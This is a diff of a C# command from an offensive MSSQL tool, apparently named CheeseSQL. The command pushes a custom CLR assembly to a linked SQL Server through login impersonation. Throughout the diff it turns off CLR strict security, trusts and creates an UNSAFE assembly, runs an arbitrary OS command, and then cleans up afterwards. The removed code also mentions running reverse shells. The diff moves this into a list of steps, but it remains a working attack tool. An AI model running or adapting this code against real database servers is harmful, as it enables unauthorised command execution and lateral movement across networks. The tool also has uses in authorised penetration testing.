@@ -35,9 +35,6 @@ namespace CheeseSQL.Commands
 
         public void Execute(Dictionary<string, string> arguments)
         {
-
-            string user = "";
-            string password = "";
             string connectInfo = "";
             string database = "";
             string connectserver = "";
@@ -139,43 +136,14 @@ namespace CheeseSQL.Commands
             }
 
 
-            if (sqlauth)
+            SqlConnection connection;
+            SQLExecutor.ConnectionInfo(arguments, connectserver, database, sqlauth, out connectInfo);
+            if (String.IsNullOrEmpty(connectInfo))
             {
-                if (arguments.ContainsKey("/user"))
-                {
-                    user = arguments["/user"];
-                }
-                if (arguments.ContainsKey("/password"))
-                {
-                    password = arguments["/password"];
-                }
-                if (String.IsNullOrEmpty(user))
-                {
-                    Console.WriteLine("\r\n[X] You must supply the SQL account user!\r\n");
-                    return;
-                }
-                if (String.IsNullOrEmpty(password))
-                {
-                    Console.WriteLine("\r\n[X] You must supply the SQL account password!\r\n");
-                    return;
-                }
-                connectInfo = "Data Source= " + connectserver + "; Initial Catalog= " + database + "; User ID=" + user + "; Password=" + password;
+                return;
             }
-            else
+            if (!SQLExecutor.Authenticate(connectInfo, out connection))
             {
-                connectInfo = "Server = " + connectserver + "; Database = " + database + "; Integrated Security = True;";
-            }
-
-            SqlConnection connection = new SqlConnection(connectInfo);
-
-            try
-            {
-                connection.Open();
-                Console.WriteLine($"[+] Authentication to the '{database}' Database on '{connectserver}' Successful!");
-            }
-            catch
-            {
-                Console.WriteLine($"[-] Authentication to the '{database}' Database on '{connectserver}' Failed.");
                 return;
             }
 
@@ -183,237 +151,30 @@ namespace CheeseSQL.Commands
 
             string hash;
             string hexData = AssemblyLoader.LoadAssembly(assembly, out hash, clazz, method, compile);
-             
-            Console.WriteLine("[*] Enabling Advanced options..");
-            string enableAdvOptions = $"EXEC ('sp_configure ''show advanced options'', 1; RECONFIGURE;') AT [{target}]";
 
-            if (!String.IsNullOrEmpty(impersonate_linked))
+
+            var procedures = new Dictionary<string, string>();
+
+            procedures.Add("Enabling advanced options..", $"sp_configure 'show advanced options', 1; RECONFIGURE;");
+            procedures.Add("Enabling 'clr enabled'..", $"sp_configure 'clr enabled', 1; RECONFIGURE;");
+            procedures.Add("Enabling 'clr strict security'..", $"sp_configure 'clr strict security', 0; RECONFIGURE;");
+            procedures.Add("Adding assembly to trusted list..", $"sp_add_trusted_assembly @hash={hash};");
+            procedures.Add($"Creating assembly [{assembly}]..", $"CREATE ASSEMBLY [{assembly}] FROM {hexData} WITH PERMISSION_SET = UNSAFE;");
+            procedures.Add($"Creating procedure [{assembly}].[{clazz}].[{method}]..", $"CREATE PROCEDURE [dbo].[{method}] @command NVARCHAR (4000) AS EXTERNAL NAME [{assembly}].[{clazz}].[{method}];");
+
+            procedures.Add("Executing command..", $"{method} '{cmd}';");
+
+            procedures.Add("Dropping procedure..", $"DROP PROCEDURE [dbo].[{method}];");
+            procedures.Add("Dropping assembly..", $"DROP ASSEMBLY [{assembly}];");
+            procedures.Add("Removing assembly from trusted list..", $"sp_drop_trusted_assembly @hash={hash};");
+            procedures.Add("Restoring CLR strict security'..", $"sp_configure 'clr strict security', 1; RECONFIGURE;");
+            procedures.Add("Disabling CLR..", $"sp_configure 'clr enabled', 0; RECONFIGURE;");
+
+            foreach (string step in procedures.Keys)
             {
-                enableAdvOptions = $"EXEC('EXECUTE AS LOGIN = ''{impersonate_linked}'' EXEC sp_configure ''show advanced options'', 1; RECONFIGURE;') AT [{target}]";
+                Console.WriteLine("[*] {0}", step);
+                SQLExecutor.ExecuteLinkedProcedure(connection, procedures[step], target, impersonate, impersonate_linked);
             }
-
-
-            if (!String.IsNullOrEmpty(impersonate))
-            {
-                enableAdvOptions = $"EXECUTE AS LOGIN = '{impersonate}' {enableAdvOptions}";
-            }
-
-            SqlCommand command = new SqlCommand(enableAdvOptions, connection);
-            SqlDataReader reader = command.ExecuteReader();
-            reader.Read();
-            reader.Close();
-
-            Console.WriteLine("[*] Enabling CLR..");
-            string baseCmd = $"sp_configure ''clr enabled'', 1; RECONFIGURE;";
-            string enableCLR = $"EXEC ('{baseCmd}') AT [{target}]";
-            if (!String.IsNullOrEmpty(impersonate_linked))
-            {
-                enableCLR = $"EXEC('EXECUTE AS LOGIN = ''{impersonate_linked}'' EXEC {baseCmd}') AT [{target}]";
-            }
-
-            if (!String.IsNullOrEmpty(impersonate))
-            {
-                enableCLR = $"EXECUTE AS LOGIN = '{impersonate}' {enableCLR}";
-            }
-            command = new SqlCommand(enableCLR, connection);
-            reader = command.ExecuteReader();
-            reader.Read();
-            reader.Close();
-
-            Console.WriteLine("[*] Disabling CLR Security..");
-            baseCmd = $"sp_configure ''clr strict security'', 0; RECONFIGURE;";
-            string disableCLRSecurity = $"EXEC ('{baseCmd}') AT [{target}]";
-            if (!String.IsNullOrEmpty(impersonate_linked))
-            {
-                disableCLRSecurity = $"EXEC('EXECUTE AS LOGIN = ''{impersonate_linked}'' EXEC {baseCmd}') AT [{target}]";
-            }
-
-            if (!String.IsNullOrEmpty(impersonate))
-            {
-                disableCLRSecurity = $"EXECUTE AS LOGIN = '{impersonate}' {disableCLRSecurity}";
-            }
-            command = new SqlCommand(disableCLRSecurity, connection);
-            reader = command.ExecuteReader();
-            reader.Read();
-            reader.Close();
-
-            Console.WriteLine("[*] Adding assembly to trusted list..");
-            baseCmd = $"sp_add_trusted_assembly @hash={hash};";
-            string addTrustedAssembly = $"EXEC ('{baseCmd}') AT [{target}]";
-            if (!String.IsNullOrEmpty(impersonate_linked))
-            {
-                addTrustedAssembly = $"EXEC('EXECUTE AS LOGIN = ''{impersonate_linked}'' EXEC {baseCmd}') AT [{target}]";
-            }
-
-            if (!String.IsNullOrEmpty(impersonate))
-            {
-                addTrustedAssembly = $"EXECUTE AS LOGIN = '{impersonate}' {addTrustedAssembly}";
-            }
-            command = new SqlCommand(addTrustedAssembly, connection);
-            reader = command.ExecuteReader();
-            reader.Read();
-            reader.Close();
-
-            Console.WriteLine("[*] Creating assembly {0}..", assembly);
-            baseCmd = $"CREATE ASSEMBLY {assembly} FROM {hexData} WITH PERMISSION_SET = UNSAFE;";
-            string createAssembly = $"EXEC ('{baseCmd}') AT [{target}]";
-            if (!String.IsNullOrEmpty(impersonate_linked))
-            {
-                createAssembly = $"EXEC('EXECUTE AS LOGIN = ''{impersonate_linked}'' EXECUTE(''{baseCmd}'');') AT [{target}]";
-            }
-
-            if (!String.IsNullOrEmpty(impersonate))
-            {
-                createAssembly = $"EXECUTE AS LOGIN = '{impersonate}' {createAssembly}";
-            }
-            command = new SqlCommand(createAssembly, connection);
-            reader = command.ExecuteReader();
-            reader.Read();
-            reader.Close();
-
-            Console.WriteLine("[*] Creating procedure [{0}].[{1}].[{2}]..", assembly, clazz, method);
-
-            baseCmd = $"CREATE PROCEDURE [dbo].[{method}] @command NVARCHAR (4000) AS EXTERNAL NAME [{assembly}].[{clazz}].[{method}];";
-            string createProcedure = $"EXEC ('{baseCmd}') AT [{target}]";
-            if (!String.IsNullOrEmpty(impersonate_linked))
-            {
-                createProcedure = $"EXEC('EXECUTE AS LOGIN = ''{impersonate_linked}'' EXECUTE(''{baseCmd}'')') AT [{target}]";
-            }
-
-            if (!String.IsNullOrEmpty(impersonate))
-            {
-                createProcedure = $"EXECUTE AS LOGIN = '{impersonate}' {createProcedure}";
-            }
-            command = new SqlCommand(createProcedure, connection);
-            reader = command.ExecuteReader();
-            reader.Read();
-            reader.Close();
-
-            baseCmd = $"EXEC {method} ''{cmd}'';";
-            string execCmd = $"EXEC ('{baseCmd}') AT [{target}]";
-            if (!String.IsNullOrEmpty(impersonate_linked))
-            {
-                execCmd = $"EXEC('EXECUTE AS LOGIN = ''{impersonate_linked}'' {baseCmd};') AT [{target}]";
-            }
-
-            if (!String.IsNullOrEmpty(impersonate))
-            {
-                execCmd = $"EXECUTE AS LOGIN = '{impersonate}' {execCmd}";
-            }
-
-            try
-            {
-                command = new SqlCommand(execCmd, connection);
-                Console.WriteLine("[*] Executing command..");
-                using (reader = command.ExecuteReader())
-                {
-                    try
-                    {
-                        reader.Read();
-                        Console.WriteLine("[+] Command result: " + reader[0]);
-                    }
-                    catch { }
-                }
-            }
-            catch (SqlException e)
-            {
-                if (e.Message.Contains("Execution Timeout Expired"))
-                {
-                    Console.WriteLine("[*] The SQL Query hit the timeout. If you were executing a reverse shell, this is normal");
-                    connection = new SqlConnection(connectInfo);
-                    connection.Open();
-                }
-                else
-                {
-                    Console.WriteLine($"[-] Exception: {e.Message}");
-                    return;
-                }
-            }
-
-            Console.WriteLine("[*] Drop procedure..");
-            baseCmd = $"DROP PROCEDURE [dbo].[{method}];";
-            string dropProcedure = $"EXEC ('{baseCmd}') AT [{target}]";
-            if (!String.IsNullOrEmpty(impersonate_linked))
-            {
-                dropProcedure = $"EXEC('EXECUTE AS LOGIN = ''{impersonate_linked}'' EXECUTE(''{baseCmd}'')') AT [{target}]";
-            }
-
-            if (!String.IsNullOrEmpty(impersonate))
-            {
-                dropProcedure = $"EXECUTE AS LOGIN = '{impersonate}' {dropProcedure}";
-            }
-            command = new SqlCommand(dropProcedure, connection);
-            reader = command.ExecuteReader();
-            reader.Read();
-            reader.Close();
-
-            Console.WriteLine("[*] Removing assembly to trusted list..");
-            baseCmd = $"sp_drop_trusted_assembly @hash={hash};";
-            string dropTrustedAssembly = $"EXEC ('{baseCmd}') AT [{target}]";
-            if (!String.IsNullOrEmpty(impersonate_linked))
-            {
-                dropTrustedAssembly = $"EXEC('EXECUTE AS LOGIN = ''{impersonate_linked}'' EXEC {baseCmd}') AT [{target}]";
-            }
-
-            if (!String.IsNullOrEmpty(impersonate))
-            {
-                dropTrustedAssembly = $"EXECUTE AS LOGIN = '{impersonate}' {dropTrustedAssembly}";
-            }
-            command = new SqlCommand(dropTrustedAssembly, connection);
-            reader = command.ExecuteReader();
-            reader.Read();
-            reader.Close();
-
-            Console.WriteLine("[*] Drop assembly..");
-            baseCmd = $"DROP ASSEMBLY [{assembly}]";
-            string dropAssembly = $"EXEC ('{baseCmd}') AT [{target}]";
-            if (!String.IsNullOrEmpty(impersonate_linked))
-            {
-                dropAssembly = $"EXEC('EXECUTE AS LOGIN = ''{impersonate_linked}'' EXECUTE(''{baseCmd}'')') AT [{target}]";
-            }
-
-            if (!String.IsNullOrEmpty(impersonate))
-            {
-                dropAssembly = $"EXECUTE AS LOGIN = '{impersonate}' {dropAssembly}";
-            }
-            command = new SqlCommand(dropAssembly, connection);
-            reader = command.ExecuteReader();
-            reader.Read();
-            reader.Close();
-
-            Console.WriteLine("[*] Enabling CLR Security..");
-            baseCmd = $"sp_configure ''clr strict security'', 1;";
-            string enableCLRSecurity = $"EXEC ('{baseCmd}') AT [{target}]";
-            if (!String.IsNullOrEmpty(impersonate_linked))
-            {
-                enableCLRSecurity = $"EXEC('EXECUTE AS LOGIN = ''{impersonate_linked}'' EXEC {baseCmd}') AT [{target}]";
-            }
-
-            if (!String.IsNullOrEmpty(impersonate))
-            {
-                enableCLRSecurity = $"EXECUTE AS LOGIN = '{impersonate}' {enableCLRSecurity}";
-            }
-            command = new SqlCommand(enableCLRSecurity, connection);
-            reader = command.ExecuteReader();
-            reader.Read();
-            reader.Close();
-
-            Console.WriteLine("[*] Disabling CLR..");
-            baseCmd = $"sp_configure ''clr enabled'', 0;";
-            string disableCLR = $"EXEC ('{baseCmd}') AT [{target}]";
-            if (!String.IsNullOrEmpty(impersonate_linked))
-            {
-                disableCLR = $"EXEC('EXECUTE AS LOGIN = ''{impersonate_linked}'' EXEC {baseCmd}') AT [{target}]";
-            }
-
-            if (!String.IsNullOrEmpty(impersonate))
-            {
-                disableCLR = $"EXECUTE AS LOGIN = '{impersonate}' {disableCLR}";
-            }
-            command = new SqlCommand(disableCLR, connection);
-            reader = command.ExecuteReader();
-            reader.Read();
-            reader.Close();
 
             connection.Close();
         }
